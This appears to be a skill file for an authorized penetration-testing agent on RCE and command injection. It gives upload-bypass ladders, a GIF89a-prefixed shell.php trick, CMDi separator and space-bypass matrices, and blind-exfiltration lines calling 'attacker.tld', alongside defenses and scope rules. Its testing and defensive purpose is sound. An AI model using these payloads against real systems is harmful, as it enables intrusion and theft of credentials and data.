---
name: rce-cmdi-sink-chains
category: injection
domain: cross-cutting
description: "RCE and command-injection tradecraft for 2026: filename-as-injection-sink (template injection in upload filename), magic-byte vs client-extension validation differentials, second-order SSTI where a low-privilege user poisons a template an admin renders, upload-to-RCE chains, deserialization sinks, line-terminator escape bugs, Windows env-var space bypass, and the full CMDi separator/quote/argument matrix. Use when hunting RCE, when a webshell upload needs a bypass, or when uploads are validated but filenames are attacker-controlled."
priority: high
---

# RCE & Command Injection — sink chains and current bypasses

Prerequisites: `injection-surface-mapper` (find the sink), then
`representation-differential-hunting` (for the bypass layer).
Existing coverage: `web-37-rce`, `web-06-command-injection`, `hunt-rce`,
`web-25-file-upload`, `api-14-deserialization`, `hunt-ssti`, `web-03-ssti`,
`web-68-nextjs`, `hunt-cloud-misconfig`.

**Authorized testing only. Confirm scope before probing.** RCE testing that
escapes a sandbox, or touches a shared host, is a real incident. Stop and ask
if the boundary is unclear.

**Citation rule:** every CVE ID below was checked against cve.org / NVD / OSV /
GHSA. Re-verify before reuse, and re-read the stated **preconditions** — several
of these are configuration- or reachability-dependent, and misreporting a
precondition is how a valid finding gets triaged as misconfiguration. Note also
that some vendor advisories say a CVE was *"requested"* rather than *assigned*;
those IDs may not resolve on cve.org yet, so cite the GHSA or the release note
as the primary reference.

---

## The framing that finds RCE faster than payload spraying

Most people hunt RCE by trying to upload `shell.php`. That is the *last* step
and the least interesting one. RCE lives in a **chain**, and the chain usually
breaks earlier — at a validation, a filename, a template, or a deserializer.

```
source → parser → validator → storage/render → sink
         ↑            ↑           ↑            ↑
      Ghost Bits   CI4-style   filename     exec/eval/
      differential mismatch    template     unserialize
```

Audit each hop for "does this step check the same representation the next step
uses?" Every RCE in this skill is a **differential at one of those hops**.

---

## 1. Filenames are injection sinks (not just storage paths)

The most under-tested injection surface in web apps. A filename is
attacker-controlled, frequently logged, echoed, templated, and passed to shell
utilities — and almost never sanitized as *content*.

### 1a. Template injection in the upload filename — CVE-2026-97359 (CVSS 10.0)

Rejetto HFS2 2.0.0–2.4.0 (legacy 2.x line; not HFS 3.x), unauthenticated RCE,
CWE-1336, VulnCheck-assigned, no vendor patch. Three defects stack:

1. The upload handler puts the filename into the template symbol map as
   `%item-resource%` **without** the HTML/macro escaping applied to sibling
   fields like `%item-name%`.
2. Symbol replacement runs **sequentially**, so a value introduced by one
   substitution is re-scanned as template syntax by a later step. That is the
   re-interpretation primitive.
3. The macro dispatcher performs **no authorization check** before running the
   `exec` macro.

So a filename containing a closing template quoting sequence followed by an
`exec` macro is re-parsed as template markup and executed as a host command,
with no credentials. (Root cause is escaping + sequential re-scan + a missing
auth gate on the macro — three separate defects, so remediation needs all three.)

Generalize it: any time a filename is interpolated into a template, log format
string, shell command, or query, it is an injection sink. Test filenames with
`{{...}}`, `${...}`, `<%=...%>`, `#{...}`, backticks, and `$(...)`.

### 1b. Ghost Bits in `filename*` — Tomcat `RFC2231Utility`

Tomcat's RFC 2231 decoder for `Content-Disposition: filename*=UTF-8''…` casts
each non-percent character **directly to byte**, dropping the high 8 bits. Wrap
each byte of a webshell in a Unicode char whose low 8 bits match: the decoder
reconstructs the payload, the WAF sees harmless CJK text.

**This re-enables file-upload RCE on stacks believed patched.** See
`representation-differential-hunting` §1 for the full sink table.

### 1c. Filename as shell argument — classic CMDi

`convert`, `ffmpeg`, `identify`, `exiftool`, `pdftoppm`, `gs`, `rsync`, `tar`,
`zip`, `unzip`, `git`, `svn` all take filenames into a shell string.

- `; touch /tmp/x` — classic separator
- `${IFS}` instead of spaces: `id${IFS}-u`
- globbing to avoid typing the name: `/???/c?t /???/p??swd`
- backslash-newline continuation
- leading `-` making the filename an **option** (argument injection):
  `-oProxyCommand=...` for `curl`, `-I` for some tools

---

## 2. Validation differentials on upload (CI4 pattern)

**CVE-2026-63223 — CodeIgniter 4 <4.7.4, CVSS 9.8, unauthenticated RCE.**

`is_image` and `mime_in` called `getExtension()` — derived from **magic bytes** —
and never called `getClientExtension()` (the **client filename**):

```php
// VULNERABLE
$type = Mimes::guessTypeFromExtension($file->getExtension()) ?? '';
//      getExtension() = "gif" (from magic bytes)
//      getClientExtension() = "php" (from client filename) — NEVER CHECKED
if (mb_strpos($type, 'image') !== 0) return false;   // "image/gif" → PASS
// ... then saved with $file->getClientName() → shell.php
```

Prepend `GIF89a` to PHP, name it `shell.php`, validation passes, file is stored
as `shell.php` in a PHP-executable directory. Fix in 4.7.4 added
`hasInvalidImageClientExtension()`, which cross-checks
`getClientExtension()` against `guessExtension()`.
Advisory: GHSA-mmj4-63m4-r6h5.

**Three preconditions must all hold** (per the advisory — this is a
config-dependent bug, not a framework-wide one):
1. validates with `is_image`/`mime_in` and no independent extension check
2. saves the file **preserving the client filename**
3. stores it in a web-accessible directory where the script executes

Report the preconditions explicitly. A triager will otherwise dismiss it as
"misconfiguration" — you need to show all three on the target.

### The general audit

For every upload validator, build this table:

| Validator reads | Storage/action uses | Bug? |
|---|---|---|
| magic-byte type | client filename | **CI4** |
| Content-Type header | actual bytes | trivial spoof |
| extension allowlist | double extension | `shell.php.jpg` |
| basename only | traversal in name | `../../` |
| MIME sniff | interpreter config | polyglot |

### Bypass ladder for a normal allowlist

1. **Case** — `shell.PHP`, `shell.Php`, `shell.pHp` (if check is case-sensitive)
2. **Double extension** — `shell.php.jpg` (server may execute on any segment)
3. **Null byte** — `shell.php%00.jpg` (older PHP/CF truncates at the null)
4. **Alternative extensions** — `.phtml`, `.php5`, `.phar`, `.php7`, `.pht`
5. **Double encoding** — `%252e%252e%252f` for traversal in a decoded name
6. **Magic-byte prefix** — `GIF89a`/`\x89PNG`/JPEG SOI before `<?php` (CI4 case)
7. **Long-extension truncation** — very long name; some code truncates then
   re-appends, or checks prefix but the handler uses suffix
8. **Missing separator** — `shell.php.` (trailing dot) on Windows
9. **HTACCESS/upload config** — `.htaccess` with `AddType application/x-httpd-php .jpg`
10. **Polyglot** — valid JPEG/PNG **and** valid PHP; passes magic-byte checks

### Confirming RCE honestly

Request the uploaded file and read the response:
- returns your source as text → upload worked, PHP is **not** executing
- returns command output → **RCE confirmed**

That distinction matters in a report. "Uploaded a .php file" is not RCE.
"Uploaded `.php`, requested it, and received `uid=33(www-data)`" is.

### What actually stops it (for report remediation sections)

Extension allowlist · magic bytes · **random server-generated filename** (kills
the differential) · store outside web root · `Content-Disposition: attachment` ·
image **re-encoding** (destroys embedded script; the only reliable polyglot
defense) · disable execution in the upload dir.

Anti-virus lags new webshell variants — do not recommend it as primary control.

---

## 3. Image/media decoder RCE — the transitive-dependency class

The most under-rated RCE class, because the sink is not in the application at
all. It is in a native C/C++ library reached through an ordinary image upload.

The 2026 "HEIF Heist" campaign traced a single transitive dependency —
**libheif** — into OpenAI, Slack, Meta, GitHub Enterprise, Next.js, Discourse,
Ruby on Rails, Astro, and Gatsby. One bug family, many victims, because the
dependency is invisible in the app's own code.

### Go after the dependency, not the app

The research team targeted Discourse's libheif specifically *because* "the
Discourse app itself is actually not an easy target." When the application layer
is mature and hardened, the remaining surface is the code you did not write.

### The fallback-path rule — the highest-value recon heuristic here

Discourse validated images with FastImage — but **FastImage does not support
HEIF**. HEIC/HEIF files therefore fell through to ImageMagick's `magick`
command for conversion, which exposed libheif directly to attacker-controlled
bytes.

> For every input type your app handles, find what handles the case the
> primary library *does not* support. Unsupported format → fallback path →
> different parser → different sink → far less reviewed, usually native code
> with memory-safety bugs.

Enumerate the fallback: alternate extensions, MIME types the primary validator
rejects, corrupt or truncated files, animated vs static, exotic color profiles,
container-within-container formats, and anything a CDN will happily re-encode.

### "Patched upstream" ≠ "patched in the image"

The specific bug had been fixed upstream the previous year, but the commit "was
not documented as a security fix and received no CVE" — so Debian 12 and 13 never
backported it in time. The Discourse Docker image (Debian 12) shipped libheif
**1.19.7**; Debian 13 still had 1.19.8.

Three checks, in order:
1. What version is **actually installed** in the image? (Not what the manifest
   or lockfile claims.)
2. Does the fix you are relying on have a **CVE**? Undocumented security fixes
   do not get backported by distributions.
3. Has the distro published a security update? (Debian DSA-6417-1, 2026-08-08.)

### The root-cause pattern worth stealing: one unenforced invariant, a dozen consumers

libheif advisory **GHSA-2jg2-4ch7-h545** (≤1.23.1 → 1.23.2, reported by Meta
Product Security, **11 separate vulnerabilities**, CWE-125/369/787) traced every
one to a single incorrect assumption:

> Throughout libheif, code assumes a `HeifPixelImage`'s logical geometry
> (`m_width`/`m_height`) accurately describes every channel plane it holds, and
> that each `heif_channel` is backed by at most one plane. **Neither invariant
> is enforced anywhere.** Derived items (`iden`, and auxiliary `auxl` chains) let
> an attacker construct images that violate both, and roughly a dozen consumers
> then index planes using geometry the planes do not have.

**This is the transferable audit pattern.** When you find one memory-safety bug
in a native library, do not stop at that instance — find the *unenforced
invariant* behind it, then count the consumers that assume it. One missing
assertion × twelve call sites = twelve bugs and a single fix location.

Note: that advisory has **no CVE ID** — cite the GHSA. A related
Meta-disclosure CVE, **CVE-2026-32882**, covers the same family and is what the
Discourse advisory references.

### Consumer-side impact

| Consumer | ID | Reachability | Fix |
|---|---|---|---|
| Next.js Image Optimization | GHSA-2xp9-vwfh-vxw4 | **unauthenticated RCE**, crafted AVIF | `next@15.5.24` / `next@16.3.3`; AVIF served as-is, not resized |
| Discourse | GHSA-vhm9-85gw-x335 / CVE-2026-32882, 8.8 | authed RCE via image upload | 2026.7.0 / 2026.6.1 / 2026.5.2 / 2026.1.6 + ImageMagick sandboxing |
| Meta product suite | GHSA-2jg2-4ch7-h545 | RCE via image upload | libheif 1.23.2+ (1.23.4 current) |
| GitHub Enterprise Server | CVE-2026-19118 | authed RCE, race on upload (below) | 3.21.5 |

Next.js's mitigation is a pattern worth copying: **disable the format entirely**
rather than trying to filter malicious files. Patched releases stop optimizing
AVIF at all until a fixed libheif ships.

### Two adjacent upload-path bugs worth hunting directly

**Validation→processing race (TOCTOU) — CVE-2026-19118, GHES 3.21.5, HIGH.**
A race condition "replaced a validated upload with attacker-controlled content
before processing": the validator approved one artifact and the processor
consumed another. Required authed repo write. Hunt this wherever validation and
consumption are separate steps with any writable path between them — see
`api-25-distributed-race` and `web-35-race-condition`.

**Declared name vs effective path — CVE-2026-15343, GHES 3.21.3, HIGH.**
Dependency-file path validation "checked only the declared file name and not the
effective path derived from the file's directory and symlink target", so a symlink
allowed writes outside the intended directory — including GitHub Actions workflow
files, which then execute with repo secrets under `pull_request_target` or
auto-merge. Validate the **resolved** path (`realpath()`), never the declared
name, and reject symlinks. See `representation-differential-hunting` §3.

### Detection and defense in depth

- **Alert on image-processor crashes and restarts.** Across the whole campaign
  only one company noticed anything — after thousands of uploads and repeated
  processor crashes. Crash loops are the strongest available signal, and they are
  what a defender would have used to catch this.
- Isolate image processing in hardened, ephemeral sandboxes. Discourse added
  ImageMagick sandboxing as a *separate* control from the patch — that is the
  right posture for a class with this cadence.
- Use ImageMagick's security policy to restrict accepted formats and cap
  resource usage.
- Disable untrusted HEIF/AVIF decoding where the feature is not needed.

### Exploitability is no longer the deprioritizing assumption

The campaign adapted an exploit to each new victim in **one to two days**,
largely without knowing the exact libheif version, libc, or deployment layout,
with a total reported token cost under $3,000 across two months and three
researchers.

So a known memory-corruption CVE in a ubiquitous dependency is **not** a
low-priority finding on the grounds that exploitation is "hard" — treat that
assumption as stale. This cuts both ways and is the core of prioritization here:
a pre-auth decoder RCE outranks a reflected XSS, and it is equally the argument
for patching dependency CVEs fast.

## 4. Second-order SSTI — low-priv upload, admin renders (CVE-2026-61707, CVSS 9.0)

The most under-rated RCE pattern, because **the low-privilege user supplies the
payload and the high-privilege user triggers it.**

Pattern from a real case-report platform:
- `customer_user` (lowest portal role) could upload case-report **templates**;
  validation checked the filename extension only, never content
- templates rendered by **unsandboxed Jinja2** with no `autoescape` when an
  admin/analyst generated a DOCX/PDF report
- single global template store with **no `customer_code` column** → any tenant
  could delete the org's legitimate default and re-upload a malicious one under
  the same name
- **so the poisoning is invisible to the admin** who later renders it

That last point is the real lesson: *a shared global store with no tenant
isolation turns a low-sev upload bug into a high-sev RCE against an
administrator.*

**Hunt checklist:**
- who can **upload or edit** templates / themes / layouts / rules / snippets?
- who can **render** them, and is that a different, more privileged role?
- is the engine **sandboxed**? (`SandboxedEnvironment`, no `autoescape`)
- is the store **tenant-scoped**, or global?
- can a low-priv user **delete or overwrite** the default artifact?

Any "yes, upload" + "no, not sandboxed" + "rendered by someone else" is a P1
candidate. Grep for `SandboxedEnvironment` / `autoescape` to confirm absence.

---

## 5. Deserialization sinks

| Language | Sink | Note |
|---|---|---|
| PHP | `unserialize()` on untrusted data | gadget chains; CVE-2026-42473 (MixPHP cache handler) — RCE once the attacker can influence the backing store |
| Python | `pickle.loads`, `yaml.load` (no SafeLoader) | RCE on load |
| Java | `ObjectInputStream.readObject`, Jackson `enableDefaultTyping`, Fastjson | see Koollab note below |
| .NET | `BinaryFormatter` | never safe, no exceptions |
| Ruby | `Marshal.load`, `YAML.load` | RCE |
| Node | `node-serialize`, custom revivers | RCE |

**CVE-2026-42473 (MixPHP Framework 2.x ≤2.2.17, CWE-502, CVSS 8.1):** the
**cache** handler calls `unserialize()` on data pulled from the backing store
(Redis/Memcached/filesystem) with no allowlist and no integrity check.
Sibling **CVE-2026-42472** is the **session** handler (also 8.1); the same
bundle includes `sync-invoke` TCP-server/client deserialization
(CVE-2026-37552 / CVE-2026-42471, 9.8) and SQLi in `data()` and `joinOn()`
(CVE-2026-42474 / CVE-2026-42475, 8.8).

**Note the precondition honestly:** these are *trust-boundary* bugs, not
unauthenticated RCE. You need the attacker to influence what the handler reads —
compromise or write into the backing store, or reach the `sync-invoke` server.
That makes them a **chain target**: pair one of them with a separate write
primitive (SSRF to Redis, log injection into a file-backed handler, or the SQLi
above) rather than reporting them standalone.

Fix: `unserialize($input, ['allowed_classes' => false])`, or JSON where object
types aren't needed. Detection WAF indicators for PHP serialization:
`O:\d+:`, `C:`, and `a:`/`s:` markers in bodies and uploads.

**Deserialization is the highest-value escalation target when you already have
SQLi or a write primitive.** **CVE-2026-63233** (Koollab LMS 5.3.2, CVSS 9.9,
CWE-89 + CWE-502, Singapore CSA advisory AL-2026-094, no patched version) is the
exact template: the assessment *overall answer* endpoint passes attacker input
**unsanitized to both a SQL query and PHP's `unserialize()`** → gadget chain
writes a webshell to a web-accessible path → RCE. Sibling **CVE-2026-63232** is
the identical bug in the *reinforcement* endpoint. Both need only an
**authenticated** account (`PR:L`), which is a low bar — and because the same
parameter feeds both a query and a deserializer, one endpoint gives you
exfiltration *and* code execution.

Detection artifacts: `O:`/`a:`/`s:` markers in request bodies; `.php`/`.phtml`
appearing under web-accessible dirs; web server spawning `/bin/sh`, `bash`,
`cmd.exe`; outbound connections to unfamiliar IPs.

---

## 6. Command injection — the current bypass matrix

### Separators (try in order)

```bash
; id          # semicolon
| id          # pipe
&& id         # and
|| id         # or
$(id)         # command substitution
`id`          # backticks
%0a / %0d     # newline / carriage return  ← most often forgotten
%0d%0a       # CRLF — try this FIRST on Windows
```

**Line terminators are the highest-value probe and the most-skipped.** They slip
past blocklists that enumerate `; | & $ ( ) \`>`, and they are exactly what
broke **CVE-2026-9277** (`shell-quote`): `quote()` escaped with `/(.)/g` in
JavaScript, and **`/(.)/g` does not match `\n`, `\r`, U+2028, or U+2029** — so a
line terminator passed through unescaped and POSIX shells treat it as a command
separator. That is a whole bug class: **always ask "what does my sanitizer's
regex not match?"**

Also probe: U+00A0, U+2028, U+3000 (Unicode whitespace that `\s`-style classes
and `.trim()` miss in some languages).

### Space bypass

```bash
id${IFS}-u                     # Linux IFS
$IFS$9id                      # tab via IFS
i<d                           # stdin redirect
ping%09-c%09127.0.0.1        # tab
```

**Windows env-var substring expansion** — use a variable containing a space:

```bash
ping%PROGRAMFILES:~10,1%127.0.0.1     # char at index 10 of %PROGRAMFILES% = space
```

`%PROGRAMFILES%` is `C:\Program Files` on most systems, so index 10 is the
space. Build whole commands this way:
`%PROGRAMFILES:~3,1%%SYSTEMROOT:~4,2%%PROGRAMFILES:~6,1%%PROGRAMFILES:~10,1%127.0.0.1`

### Quote termination

If input lands inside quotes (`prog -p "INPUT"`):
```
"; cmd #        # double-quote
'); cmd         # single-quote + close paren
$(cmd)          # substitution inside double quotes still runs
```

Then use `#` or `--` to comment out the remainder of the original command.

### Blind CMDi

```bash
sleep 10 ; ping -c 10 127.0.0.1        # timing
curl attacker.tld/$(whoami)            # OOB via DNS/HTTP
nslookup $(whoami).attacker.tld         # DNS exfil
whoami > /var/www/html/x.txt           # write-then-fetch
```

Prefer **DNS OOB** over HTTP — many environments block egress 80/443 but
permit DNS, and DNS exfil has no response-size limit.

### Full-chain template

1. Does it reach a shell, or only `execve` (no metachars)? → **argument injection**
2. Inside single quotes? → close and comment
3. Metachars stripped? → `$()`/backticks, then IFS, then encoding
4. Space blocked? → `${IFS}` / `%PROGRAMFILES:~n,1%`
5. All chars blocked? → **Ghost Bits** (Java) or Unicode variants
6. No output? → time-based, then OOB DNS
7. WAF 403 on everything? → check **TLS/JA3 fingerprint**, not just the payload

---

## 7. CTF / lab shortcut — cache poisoning to RCE

When the app is behind cache/CDN and you can write a response body into a
cached page, RCE is one step away without any injection at all: poison the
cache with **JavaScript/HTML that loads your JS from your domain**, which then
reads the admin's session and exfiltrates it. Turn that into RCE via the admin
panel, an authenticated file upload, or a CI/CD webhook.

Requires unkeyed cache key + reflected/stored input. See `hunt-cache-poison`.

---

## 8. Escalation ladder

1. **Confirm the sink exists** — do not assume. Trace or observe.
2. **Confirm attacker control** of the full string, not just a substring.
3. **Prove it, do not assert it** — `uid=33(www-data)` output, or a benign
   OOB callback. "This looks injectable" is not a finding.
4. **Then escalate** — upload webshell, template, deser, reverse shell.
5. **Stay inside the box** — prefer `id`/`whoami`/a benign OOB over a
   reverse shell unless the program explicitly allows it. Ask first.
6. **Prove the minimum, then stop.** Once impact is demonstrated, **stop
   testing** and do not read data you do not need to. The 2026 OpenAI chain
   proved repository access by having the account open a harmless PR, rather
   than reading a line of internal code — same evidence, zero unnecessary
   exposure. Write down what you will demonstrate, demonstrate exactly that,
   then stop.
7. **Prove the *scoped* finding, not your best finding.** In that same case the
   program explicitly excluded testing the forum host yet paid for the
   *identity-layer* bug. If your chain crosses into an out-of-scope host, the
   in-scope link may still be a valid, separately reportable finding — identify
   it, report it there, and do not continue testing the excluded host.

## Kill criteria

- Input reaches the sink already sanitized and you cannot find a representation
  differential → stop, document as hardening
- Uploads land outside web root **and** execution is disabled there → not RCE
- Engine is sandboxed (`SandboxedEnvironment` present) → SSTI is a sandbox
  escape hunt, a different and harder problem; re-scope before continuing
- Deserialization input cannot be attacker-influenced → no chain, stop
- WAF blocks at the transport layer (TLS fingerprint) and you cannot fix the
  client → switch to manual/browser context, do not escalate aggressively
- **Target or boundary unclear → stop and ask**

## Reporting RCE responsibly

State the exact chain with each hop's function name, prove execution with a
**benign** command output, confirm the account and its privileges, describe the
impact in terms of what you could read/write, and **do not include a working
weaponized payload in the report body** — reference the attachment or a redacted
version. Provide the fix at each hop, not just the final one.
